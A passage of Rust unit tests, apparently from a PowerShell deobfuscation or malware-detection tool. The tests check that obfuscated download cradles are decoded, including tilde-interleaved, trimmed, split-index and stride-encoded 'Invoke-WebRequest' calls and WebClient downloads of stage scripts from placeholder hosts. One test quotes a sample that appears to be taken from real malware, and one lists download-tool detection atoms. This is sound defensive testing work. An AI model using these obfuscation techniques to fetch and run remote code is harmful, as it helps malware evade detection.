Clean 0 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~o~r~d~e~r~e~d~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1' '~' ''"#;

        let out = expand_literal_replace_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-reordered-replace-extractor.example/stage.ps1'"
            ),
            "reordered replace extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_dot_replace_extractor_call_is_rewritten() {
        let text = r#"function Clean($value) {
  return $value.Replace('~','')
}
Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~c~o~n~s~t~-~d~o~t~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1'"#;

        let out = expand_literal_replace_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-const-dot-replace-extractor.example/stage.ps1'"
            ),
            "constant dot-replace extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_dash_replace_extractor_call_is_rewritten() {
        let text = r#"function Clean($value) {
  return $value -replace '~',''
}
Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~c~o~n~s~t~-~d~a~s~h~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1'"#;

        let out = expand_literal_replace_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-const-dash-replace-extractor.example/stage.ps1'"
            ),
            "constant dash-replace extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_replace_extractor_named_args_call_is_rewritten() {
        let text = r#"function Clean($value,$needle,$replacement) {
  return $value -replace $needle,$replacement
}
Clean -replacement '' -needle '~' -value 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~r~e~p~l~a~c~e~-~n~a~m~e~d~-~a~r~g~s~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1'"#;

        let out = expand_literal_replace_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-replace-named-args-extractor.example/stage.ps1'"
            ),
            "named-argument replace extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_parenthesized_lhs_replace_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$needle,$replacement) {
  return ($value) -replace $needle,$replacement
}
Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~p~a~r~e~n~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1' '~' ''"#;

        let out = expand_literal_replace_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-paren-replace-extractor.example/stage.ps1'"
            ),
            "parenthesized-lhs replace extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_parenthesized_receiver_dot_replace_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$needle,$replacement) {
  return ($value).Replace($needle,$replacement)
}
Clean 'I~n~v~o~k~e~-~W~e~b~R~e~q~u~e~s~t~ ~-~U~r~i~ ~h~t~t~p~s~:~/~/~p~s~-~p~a~r~e~n~-~d~o~t~-~r~e~p~l~a~c~e~-~e~x~t~r~a~c~t~o~r~.~e~x~a~m~p~l~e~/~s~t~a~g~e~.~p~s~1' '~' ''"#;

        let out = expand_literal_replace_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-paren-dot-replace-extractor.example/stage.ps1'"
            ),
            "parenthesized-receiver dot-replace extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_trim_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$chars) {
  return $value.Trim($chars)
}
Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1'"),
            "trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_trim_extractor_reordered_call_is_rewritten() {
        let text = r#"function Clean($unused,$value,$chars) {
  return $value.Trim($chars)
}
Clean 0 '~~~Invoke-WebRequest -Uri https://ps-reordered-trim-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-reordered-trim-extractor.example/stage.ps1'"
            ),
            "reordered trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_trim_extractor_call_is_rewritten() {
        let text = r#"function Clean($value) {
  return $value.Trim('~')
}
Clean '~~~Invoke-WebRequest -Uri https://ps-const-trim-extractor.example/stage.ps1~~~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-const-trim-extractor.example/stage.ps1'"
            ),
            "constant trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_trim_extractor_reordered_call_is_rewritten() {
        let text = r#"function Clean($unused,$value) {
  return $value.Trim('~')
}
Clean 0 '~~~Invoke-WebRequest -Uri https://ps-reordered-const-trim-extractor.example/stage.ps1~~~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-reordered-const-trim-extractor.example/stage.ps1'"
            ),
            "reordered constant trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_call_operator_trim_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$chars) {
  return $value.Trim($chars)
}
& Clean '~~~Invoke-WebRequest -Uri https://ps-call-operator-trim-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-call-operator-trim-extractor.example/stage.ps1'"
            ),
            "call-operator trim extractor call was not rewritten:\n{out}"
        );
        assert!(
            !out.contains("& 'Invoke-WebRequest"),
            "call-operator rewrite left a dangling call operator:\n{out}"
        );
    }

    #[test]
    fn literal_quoted_call_operator_trim_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$chars) {
  return $value.Trim($chars)
}
& 'Clean' '~~~Invoke-WebRequest -Uri https://ps-quoted-call-operator-trim-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-quoted-call-operator-trim-extractor.example/stage.ps1'"
            ),
            "quoted call-operator trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_variable_call_operator_trim_extractor_call_is_rewritten() {
        let text = r#"$fn = 'Clean'
function Clean($value,$chars) {
  return $value.Trim($chars)
}
& $fn '~~~Invoke-WebRequest -Uri https://ps-variable-call-operator-trim-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-variable-call-operator-trim-extractor.example/stage.ps1'"
            ),
            "variable call-operator trim extractor call was not rewritten:\n{out}"
        );
        assert!(
            !out.contains("& 'Invoke-WebRequest"),
            "variable call-operator rewrite left a dangling call operator:\n{out}"
        );
    }

    #[test]
    fn literal_trim_extractor_named_args_call_is_rewritten() {
        let text = r#"function Clean($value,$chars) {
  return $value.Trim($chars)
}
Clean -chars '~' -value '~~~Invoke-WebRequest -Uri https://ps-trim-named-args-extractor.example/stage.ps1~~~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-trim-named-args-extractor.example/stage.ps1'"
            ),
            "named-argument trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_trim_end_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$chars) {
  return $value.TrimEnd($chars)
}
Clean 'Invoke-WebRequest -Uri https://ps-trimend-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-trimend-extractor.example/stage.ps1'"),
            "trim-end extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_trim_no_arg_extractor_call_is_rewritten() {
        let text = r#"function Clean($value) {
  return $value.Trim()
}
Clean '   Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.ps1   '"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-trim-noarg-extractor.example/stage.ps1'"
            ),
            "no-arg trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_trim_no_arg_extractor_reordered_call_is_rewritten() {
        let text = r#"function Clean($unused,$value) {
  return $value.Trim()
}
Clean 0 '   Invoke-WebRequest -Uri https://ps-reordered-trim-noarg-extractor.example/stage.ps1   '"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-reordered-trim-noarg-extractor.example/stage.ps1'"
            ),
            "reordered no-arg trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_param_block_trim_extractor_call_is_rewritten() {
        let text = r#"function Clean {
  param($value,$chars)
  return $value.Trim($chars)
}
Clean '~~~Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-param-block-extractor.example/stage.ps1'"
            ),
            "param-block trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_new_item_function_trim_extractor_call_is_rewritten() {
        let text = r#"(New-Item -Path function: -Name Clean -Value {
  param($value,$chars)
  return $value.Trim($chars)
});
Clean '~~~Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-new-item-function-extractor.example/stage.ps1'"
            ),
            "New-Item function trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_new_item_function_path_name_trim_extractor_call_is_rewritten() {
        let text = r#"(New-Item Function:\Clean -Value {
  param($value,$chars)
  return $value.Trim($chars)
});
Clean '~~~Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-new-item-path-function-extractor.example/stage.ps1'"
            ),
            "New-Item function path-name trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_new_item_compact_function_path_name_trim_extractor_call_is_rewritten() {
        let text = r#"(New-Item Function:Clean -Value {
  param($value,$chars)
  return $value.Trim($chars)
});
Clean '~~~Invoke-WebRequest -Uri https://ps-compact-function-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-compact-function-extractor.example/stage.ps1'"
            ),
            "compact function path-name trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_new_item_alias_function_path_name_trim_extractor_call_is_rewritten() {
        let text = r#"(n`i Function:\Clean -Value {
  param($value,$chars)
  return $value.Trim($chars)
});
Clean '~~~Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-ni-path-function-extractor.example/stage.ps1'"
            ),
            "New-Item alias function path-name trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_set_item_function_path_name_trim_extractor_call_is_rewritten() {
        let text = r#"(Set-Item Function:\Clean -Value {
  param($value,$chars)
  return $value.Trim($chars)
});
Clean '~~~Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-set-item-path-function-extractor.example/stage.ps1'"
            ),
            "Set-Item function path-name trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_set_item_alias_function_path_name_trim_extractor_call_is_rewritten() {
        let text = r#"(s`i Function:\Clean -Value {
  param($value,$chars)
  return $value.Trim($chars)
});
Clean '~~~Invoke-WebRequest -Uri https://ps-si-path-function-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-si-path-function-extractor.example/stage.ps1'"
            ),
            "Set-Item alias function path-name trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_parenthesized_receiver_trim_extractor_call_is_rewritten() {
        let text = r#"function Clean($value,$chars) {
  return ($value).Trim($chars)
}
Clean '~~~Invoke-WebRequest -Uri https://ps-paren-receiver-extractor.example/stage.ps1~~~' '~'"#;

        let out = expand_literal_trim_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-paren-receiver-extractor.example/stage.ps1'"
            ),
            "parenthesized-receiver trim extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_split_index_extractor_call_is_rewritten() {
        let text = r#"function Piece($value,$sep,$index) {
  return $value.Split($sep)[$index]
}
Piece 'noise|Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1|tail' '|' 1"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1'"),
            "split-index extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_split_index_extractor_call_is_rewritten() {
        let text = r#"function Piece($value) {
  return $value.Split('|')[1]
}
Piece 'noise|Invoke-WebRequest -Uri https://ps-const-split-extractor.example/stage.ps1|tail'"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-const-split-extractor.example/stage.ps1'"
            ),
            "constant split-index extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_split_index_extractor_named_arg_call_is_rewritten() {
        let text = r#"function Piece($value) {
  return $value.Split('|')[1]
}
Piece -value 'noise|Invoke-WebRequest -Uri https://ps-const-split-named-arg.example/stage.ps1|tail'"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-const-split-named-arg.example/stage.ps1'"
            ),
            "constant split-index named-arg extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_constant_split_operator_index_extractor_call_is_rewritten() {
        let text = r#"function Piece($value) {
  return ($value -split '|')[1]
}
Piece 'noise|Invoke-WebRequest -Uri https://ps-const-split-operator.example/stage.ps1|tail'"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-const-split-operator.example/stage.ps1'"
            ),
            "constant split-operator extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_split_index_extractor_named_args_call_is_rewritten() {
        let text = r#"function Piece($value,$sep,$index) {
  return $value.Split($sep)[$index]
}
Piece -index 1 -value 'noise|Invoke-WebRequest -Uri https://ps-split-named-args-extractor.example/stage.ps1|tail' -sep '|'"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-split-named-args-extractor.example/stage.ps1'"
            ),
            "named-argument split-index extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_parenthesized_receiver_split_index_extractor_call_is_rewritten() {
        let text = r#"function Piece($value,$sep,$index) {
  return ($value).Split($sep)[$index]
}
Piece 'noise|Invoke-WebRequest -Uri https://ps-paren-split-extractor.example/stage.ps1|tail' '|' 1"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-paren-split-extractor.example/stage.ps1'"
            ),
            "parenthesized-receiver split-index extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_split_index_extractor_reordered_call_is_rewritten() {
        let text = r#"function Piece($index,$sep,$value) {
  return $value.Split($sep)[$index]
}
Piece 1 '|' 'noise|Invoke-WebRequest -Uri https://ps-split-reordered.example/stage.ps1|tail'"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-split-reordered.example/stage.ps1'"),
            "reordered split-index extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_split_index_extractor_reordered_call_with_dummy_arg_is_rewritten() {
        let text = r#"function Piece($unused,$value,$sep,$index) {
  return $value.Split($sep)[$index]
}
Piece 0 'noise|Invoke-WebRequest -Uri https://ps-split-reordered-dummy.example/stage.ps1|tail' '|' 1"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-split-reordered-dummy.example/stage.ps1'"
            ),
            "reordered split-index extractor call with dummy arg was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_split_operator_index_extractor_call_is_rewritten() {
        let text = r#"function Piece($value,$sep,$index) {
  return ($value -split $sep)[$index]
}
Piece 'noise|Invoke-WebRequest -Uri https://ps-split-operator.example/stage.ps1|tail' '|' 1"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-split-operator.example/stage.ps1'"),
            "split-operator extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_parenthesized_lhs_split_operator_index_extractor_call_is_rewritten() {
        let text = r#"function Piece($value,$sep,$index) {
  return (($value) -split $sep)[$index]
}
Piece 'noise|Invoke-WebRequest -Uri https://ps-paren-split-operator.example/stage.ps1|tail' '|' 1"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains(
                "'Invoke-WebRequest -Uri https://ps-paren-split-operator.example/stage.ps1'"
            ),
            "parenthesized-lhs split-operator extractor call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn literal_isplit_operator_index_extractor_call_is_rewritten() {
        let text = r#"function Piece($value,$sep,$index) {
  return ($value -isplit $sep)[$index]
}
Piece 'noise|Invoke-WebRequest -Uri https://ps-isplit-operator.example/stage.ps1|tail' '|' 1"#;

        let out = expand_literal_split_index_extractor_calls(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-isplit-operator.example/stage.ps1'"),
            "isplit-operator extractor call was not rewritten:\n{out}"
        );
    }
}

#[cfg(test)]
mod dynamic_download_invoke_tests {
    use super::dynamic_download_invoke_urls;

    #[test]
    fn dynamic_downloadstringasync_invoke_url_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$b=New-Object Net.WebClient;$b.('DownloadStringAsync').Invoke('https://dyn-async.example/a.ps1')"#,
        );

        assert_eq!(urls, vec!["https://dyn-async.example/a.ps1"]);
    }

    #[test]
    fn dynamic_downloadstringtaskasync_invoke_url_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$b=New-Object Net.WebClient;$b.('DownloadStringTaskAsync').Invoke('https://dyn-taskasync.example/a.ps1')"#,
        );

        assert_eq!(urls, vec!["https://dyn-taskasync.example/a.ps1"]);
    }

    #[test]
    fn dynamic_openreadasync_invoke_url_extracted() {
        let urls = dynamic_download_invoke_urls(
            r#"$b=New-Object Net.WebClient;$b.('OpenReadAsync').Invoke('https://dyn-openread.example/a.bin')"#,
        );

        assert_eq!(urls, vec!["https://dyn-openread.example/a.bin"]);
    }
}

#[cfg(test)]
mod skip_nth_signal_tests {
    use super::PsObfuscationSignals;

    #[test]
    fn skip_nth_signal_blocks_generic_function_loops() {
        let signals = PsObfuscationSignals::new(
            "function Inventory($items) { for ($i = 0; $i -lt $items.Length; $i++) { $items[$i] } }",
        );

        assert!(
            !signals.skip_nth,
            "generic function loops should not run skip-nth expansion"
        );
    }

    #[test]
    fn skip_nth_signal_allows_supported_stride_decoders() {
        let do_until = PsObfuscationSignals::new(
            "function Decode($x){$i=1;do{$out+=$x[$i];$i+=3}until(!$x[$i]);$out}",
        );
        assert!(do_until.skip_nth, "do/until stride decoder was blocked");

        let do_while = PsObfuscationSignals::new(
            "function Decode($x){$a=1;$b=2;$i=$a+$b;do{$out+=$x[$i];$i+=3}while($x[$i]);$out}",
        );
        assert!(do_while.skip_nth, "do/while stride decoder was blocked");

        let substring = PsObfuscationSignals::new(
            "function Decode($x){for($i=2;$i -lt $x.Length;$i+=3){$out+=$x.'su'.'Invoke'($i,1)}$out}",
        );
        assert!(substring.skip_nth, "substring stride decoder was blocked");
    }
}

#[cfg(test)]
mod skip_nth_expansion_tests {
    use super::expand_skip_nth_for_substring;

    #[test]
    fn do_while_stride_extractor_with_constant_sum_start_is_rewritten() {
        let text = r#"$a=4;$b=55;function Pick ($value) {
  $i=$a+$b
  do {
    $out += $value[$i]
    $i += 5
  } while ($value[$i])
  $out
}
Pick 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxIxxxxnxxxxvxxxxoxxxxkxxxxexxxx-xxxxWxxxxexxxxbxxxxRxxxxexxxxqxxxxuxxxxexxxxsxxxxtxxxx xxxx-xxxxUxxxxrxxxxixxxx xxxxhxxxxtxxxxtxxxxpxxxxsxxxx:xxxx/xxxx/xxxxpxxxxsxxxx-xxxxsxxxxtxxxxrxxxxixxxxdxxxxexxxx-xxxxsxxxxuxxxxmxxxx.xxxxexxxxxxxxxaxxxxmxxxxpxxxxlxxxxexxxx/xxxxsxxxxtxxxxaxxxxgxxxxexxxx.xxxxpxxxxsxxxx1'"#;

        let out = expand_skip_nth_for_substring(text);

        assert!(
            out.contains("'Invoke-WebRequest -Uri https://ps-stride-sum.example/stage.ps1'"),
            "constant-sum do/while stride call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn do_while_stride_extractor_with_sample_syntax_is_rewritten() {
        let text = "Powershell \"$preeditorially=4;$tungetalerens=55;helligaanden('Phlogisma Firsaarsfdselsdages Diastrophe Ungkokkens Gar????[IIIIi== =n,tttt: ::]y yy$ &&&t%%%rGGG,owwwwsddddrFFFFe<<<<tWWW nmmmmizzzznMMMMgVVVVeUU UrQQ.Q1ooo 4;;;;5 jjj MMMM-!!!!b tt.x');function helligaanden ($pauver) { $legman8=$preeditorially+$tungetalerens;\tdo  {$mitraille+=$pauver[$legman8];$legman8+=5} while  ($pauver[$legman8])$mitraille}\"";

        let out = expand_skip_nth_for_substring(text);

        assert!(
            out.contains("'[int]$tGwdF<WmzMVUQo; M! '"),
            "sample-syntax do/while stride call was not rewritten:\n{out}"
        );
    }

    #[test]
    fn do_while_stride_extractor_call_inside_prior_function_is_rewritten() {
        let text = concat!(
            "$preeditorially=4;$tungetalerens=55;",
            "function serviettens ($x) {",
            "$haandhvende=helligaanden('Phlogisma Firsaarsfdselsdages Diastrophe Ungkokkens Gar????[IIIIi== =n,tttt: ::]y yy$ &&&t%%%rGGG,owwwwsddddrFFFFe<<<<tWWW nmmmmizzzznMMMMgVVVVeUU UrQQ.Q1ooo 4;;;;5 jjj MMMM-!!!!b tt.x')",
            "};",
            "function helligaanden ($pauver) {",
            "$legman8=$preeditorially+$tungetalerens;",
            "do {$mitraille+=$pauver[$legman8];$legman8+=5} while ($pauver[$legman8])",
            "$mitraille",
            "};",
            "serviettens 'x'"
        );

        let out = expand_skip_nth_for_substring(text);

        assert!(
            out.contains("'[int]$tGwdF<WmzMVUQo; M! '"),
            "do/while stride call inside prior function was not rewritten:\n{out}"
        );
    }
}

#[cfg(test)]
mod embedded_single_quote_signal_tests {
    use super::PsObfuscationSignals;

    #[test]
    fn embedded_single_quote_signal_blocks_generic_triple_quotes() {
        let signals = PsObfuscationSignals::new("$name = 'demo'; Write-Host '''quoted'''");

        assert!(
            !signals.embedded_single_quote_assignment,
            "generic triple-quoted text should not run embedded assignment expansion"
        );
    }

    #[test]
    fn embedded_single_quote_signal_allows_assignments() {
        let signals =
            PsObfuscationSignals::new("$payload = '''Invoke-WebRequest https://x.test/a'''");

        assert!(
            signals.embedded_single_quote_assignment,
            "triple-quoted assignment was blocked"
        );
    }
}

#[cfg(test)]
mod ps_url_regex_atom_profile_tests {
    use super::{PsUrlRegexAtomKind, PsUrlRegexAtomProfile};

    #[test]
    fn profile_reuses_cmdlet_and_method_atom_groups() {
        let profile = PsUrlRegexAtomProfile::new("IWR https://profile.example/a");

        assert!(profile.matches(PsUrlRegexAtomKind::Iwr));
        assert!(profile.matches(PsUrlRegexAtomKind::CmdletUrl));
        assert!(profile.matches(PsUrlRegexAtomKind::UrlScheme));
        assert!(!profile.matches(PsUrlRegexAtomKind::StartBits));
    }

    #[test]
    fn profile_allows_openread_as_download_method() {
        let profile = PsUrlRegexAtomProfile::new("$wc.OpenReadAsync('host.example/a')");

        assert!(profile.matches(PsUrlRegexAtomKind::DownloadMethod));
    }

    #[test]
    fn profile_blocks_text_without_url_extractor_atoms() {
        let profile = PsUrlRegexAtomProfile::new("Write-Host inventory complete");

        for kind in [
            PsUrlRegexAtomKind::Iwr,
            PsUrlRegexAtomKind::Irm,
            PsUrlRegexAtomKind::CmdletUrl,
            PsUrlRegexAtomKind::CurlExe,
            PsUrlRegexAtomKind::Mshta,
            PsUrlRegexAtomKind::UrlScheme,
            PsUrlRegexAtomKind::DownloadMethod,
            PsUrlRegexAtomKind::DownloadFragment,
            PsUrlRegexAtomKind::CallByName,
            PsUrlRegexAtomKind::StartBits,
            PsUrlRegexAtomKind::NetWebRequest,
        ] {
            assert!(!profile.matches(kind), "unexpected match for {kind:?}");
        }
    }
}
